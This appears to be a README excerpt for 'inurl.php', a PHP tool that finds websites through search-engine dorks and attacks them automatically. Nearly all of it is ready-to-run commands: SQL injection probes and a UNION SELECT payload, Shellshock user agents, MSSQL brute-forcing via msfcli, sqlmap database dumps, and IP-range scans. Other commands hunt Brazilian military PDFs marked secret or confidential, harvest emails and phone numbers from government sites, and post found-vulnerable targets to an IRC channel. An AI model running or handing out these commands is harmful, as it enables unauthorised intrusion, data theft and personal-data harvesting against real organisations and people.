...
Proxy random        TOR 
 ----------------------------------------------------------
[+] PERMISSION EXECUTION: chmod +x inurl.php
...
-q       Choose which search engine you want through [1...24] / [e1..6]]:
 ...
 --irc Sending vulnerable to IRC / server channel.
      ...
      Usage:   --irc 'irc.rizon.net#inurlasil'
 ...
 --user-agent Define the user agent used in its request against the target.
      ...
      Complete command:    
      php inurl.php --dork '_YOU_DORK_' -s shellshock.txt --user-agent '_YOU_AGENT_XPL_SHELLSHOCK' -t 2 -a '99887766555'
 ...
 --port-write Send values for door.
     ...
     Usage:   --port-write "'NICK nk_test','USER nk_test 8 * :_ola','JOIN #inurlasil','PRIVMSG #inurlasil : minha_msg'"
...
## Commands
```properties
./inurl.php --dork 'inurl:php?id=' -s save.txt -q 1,6 -t 1 --exploit-get "?´'%270x27;"  
   
./inurl.php --dork 'inurl:aspx?id=' -s save.txt -q 1,6 -t 1 --exploit-get "?´'%270x27;" 
   
./inurl.php --dork 'site:br inurl:aspx (id|new)' -s save.txt -q 1,6 -t 1 --exploit-get "?´'%270x27;"
   
./inurl.php --dork 'index of wp-content/uploads' -s save.txt -q 1,6,2,4 -t 2 --exploit-get '?' -a 'Index of /wp-content/uploads'
   
./inurl.php --dork 'site:.mil.br intext:(confidencial) ext:pdf' -s save.txt -q 1,6 -t 2 --exploit-get '?' -a 'confidencial'
   
./inurl.php --dork 'site:.mil.br intext:(secreto) ext:pdf' -s save.txt -q 1,6 -t 2 --exploit-get '?' -a 'secreto'        
  
./inurl.php --dork 'site:br inurl:aspx (id|new)' -s save.txt -q 1,6 -t 1 --exploit-get "?´'%270x27;"
   
./inurl.php --dork '.new.php?new id' -s save.txt -q 1,6,7,2,3 -t 1 --exploit-get '+UNION+ALL+SELECT+1,concat(0x3A3A4558504C4F49542D5355434553533A3A,@@version),3,4,5;' -a '::EXPLOIT-SUCESS::'
  
./inurl.php --dork 'new.php?id=' -s teste.txt  --exploit-get ?´0x27  --command-vul 'nmap sV -p 22,80,21 _TARGET_'
   
./inurl.php --dork 'site:pt inurl:aspx (id|q)' -s bruteforce.txt --exploit-get ?´0x27 --command-vul 'msfcli auxiliary/scanner/mssql/mssql_login RHOST=_TARGETIP_ MSSQL_USER=inurl MSSQL_PASS_FILE=/home/pedr0/Documentos/passwords E'
  
./inurl.php --dork 'site:br inurl:id & inurl:php' -s get.txt --exploit-get "?´'%270x27;" --command-vul 'python ../sqlmap/sqlmap.py -u "_TARGETFULL_" --dbs'
  
./inurl.php --dork 'inurl:index.php?id=' -q 1,2,10 --exploit-get "'?´0x27'" -s report.txt --command-vul 'nmap -Pn -p 1-8080 --script http-enum --open _TARGET_'
 
./inurl.php --dork 'site:.gov.br email' -s reg.txt -q 1  --regexp '([\w\d\.\-\_]+)@([\w\d\.\_\-]+)'
  
./inurl.php --dork 'site:.gov.br email (gmail|yahoo|hotmail) ext:txt' -s emails.txt -m
  
./inurl.php --dork 'site:.gov.br email (gmail|yahoo|hotmail) ext:txt' -s urls.txt -u
 
./inurl.php --dork 'site:gov.bo' -s govs.txt --exploit-all-id  1,2,6  
 
./inurl.php --dork 'site:.uk' -s uk.txt --user-agent  'Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)' 
 
./inurl.php --dork-file 'dorksSqli.txt' -s govs.txt --exploit-all-id  1,2,6 
 
./inurl.php --dork-file 'dorksSqli.txt' -s sqli.txt --exploit-all-id  1,2,6  --irc 'irc.rizon.net#inurlasil'   
  
./inurl.php --dork 'inurl:"cgi-bin/login.cgi"' -s cgi.txt --ifurl 'cgi' --command-all 'php xplCGI.php _TARGET_'  
 
./inurl.php --target 'http://target.com.br' -o cancat_file_urls_find.txt -s output.txt -t 4
  
./inurl.php --target 'http://target.com.br' -o cancat_file_urls_find.txt -s output.txt -t 4 --exploit-get "?´'%270x27;"
  
./inurl.php --target 'http://target.com.br' -o cancat_file_urls_find.txt -s output.txt -t 4 --exploit-get "?pass=1234" -a '<title>hello! admin</title>'
  
./inurl.php --target 'http://target.com.br' -o cancat_file_urls_find_valid_cod-200.txt -s output.txt -t 5
  
./inurl.php --range '200.20.10.1,200.20.10.255' -s output.txt --command-all 'php roteador.php _TARGETIP_'  
 
./inurl.php --range-rad '1500' -s output.txt --command-all 'php roteador.php _TARGETIP_'  
 
./inurl.php --dork-rad '20' -s output.txt --exploit-get "?´'%270x27;" -q 1,2,6,4,5,9,7,8  
 
./inurl.php --dork-rad '20' -s output.txt --exploit-get "?´'%270x27;" -q 1,2,6,4,5,9,7,8   --pr
 
./inurl.php --dork-file 'dorksCGI.txt' -s output.txt -q 1,2,6,4,5,9,7,8   --pr --shellshock
 
./inurl.php --dork-file 'dorks_Wordpress_revslider.txt' -s output.txt -q 1,2,6,4,5,9,7,8  --sub-file 'xpls_Arbitrary_File_Download.txt'  
```

### Email extraction
```bash
php inurl.php  --dork '"com.br" contato  .xlsx' -m  -s emails.txt -q all
```

### External Command
```bash
php inurl.php --dork '"com.br" index.php?id id' -s sqlmap.txt --exploit-get "?´'%270x27;" --command-vul 'python ../sqlmap-dev/sqlmap.py -u "_TARGETFULL_" --dbs --batch --threads 10 -p id --random-agent'
```

### Filter Result Value
```bash
php inurl.php --dork '"com.br/wp-login.php"' -t 2  -a 'wp-login.php?action=lostpassword' -s filter_string.txt
```

### Simple fuzz 
```bash
php inurl.php --target 'https://target.com.br' -o fuzz.txt -s php_result.txt -t 2 -a 'phpMyAdmin 2.11.4'
```

### Parallel terminal ( popup )
```bash
php inurl.php --target 'https://target.com.br' -o fuzz.txt -s popup_result.txt -t 2 -a 'phpMyAdmin 2.11.4' --command-vul "nmap -sV -v  _TARGET_ ;"  --popup 
```

### Extract urls using archive.org
```bash
php inurl.php  -o 'defense.gov.txt' --au -s 'defense.gov.out'
```

### Extract values using regex
```bash
php inurl.php --dork 'contato telefone' -s 'reg.txt' -q 1 --regexp-filter '([0-9]{2}[6789][0-9]{3,4}[0-9]{4})'
```

### Validate values using regex
```bash
php inurl.php --dork 'contato telefone' -s 'reg.txt' -q 1 --regexp '([0-9]{2}[6789][0-9]{3,4}[0-9]{4})'
```
## Installation

The inurl works with [php](http://php.net/downloads.php) version **7.x**  linux platforms.
...
## Tutorial ##
* Demos: [http://youtube.com/c/inurlasil](https://www.youtube.com/playlist?list=PLV1376pVwcCmcoCmq_Z4O0ra4BqjmhIaR)
* Tutoriais: [http://blog.inurl.com.br/search/label/inurl](http://blog.inurl.com.br/search/label/inurl)
